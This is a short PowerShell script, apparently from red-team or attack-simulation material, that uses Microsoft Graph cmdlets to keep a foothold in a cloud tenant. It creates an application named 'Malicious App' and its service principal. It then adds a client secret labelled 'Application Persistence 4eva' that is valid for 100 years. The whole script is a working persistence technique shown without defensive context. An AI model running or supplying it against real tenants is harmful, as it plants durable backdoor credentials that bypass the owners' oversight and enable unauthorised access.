# Create New Tenant Application & Generate Client Secrets
# Must be run with Administrative Permissions

$graphApp = New-MGApplication -DisplayName 'Malicious App'
$graphSPParameter = @{"AppId" = "$($graphApp.AppId)"}
$graphSP = New-MgServicePrincipal -BodyParameter $graphSPParameter

$passwordCred = @{
    displayName = 'Application Persistence 4eva'
    endDateTime = (Get-Date).AddYears(100)
 }
 
 # Create client secret. This outputs clear-text password in the "secretText" field and is only visible once.
 # Client secrets can be created (and used to authenticate) for both app registration and servicePrincipal objects.
 Add-MgApplicationPassword -applicationId $graphApp.Id -PasswordCredential $passwordCred
 #Add-MgServicePrincipalPassword -ServicePrincipalId $graphSP.Id -PasswordCredential $passwordCred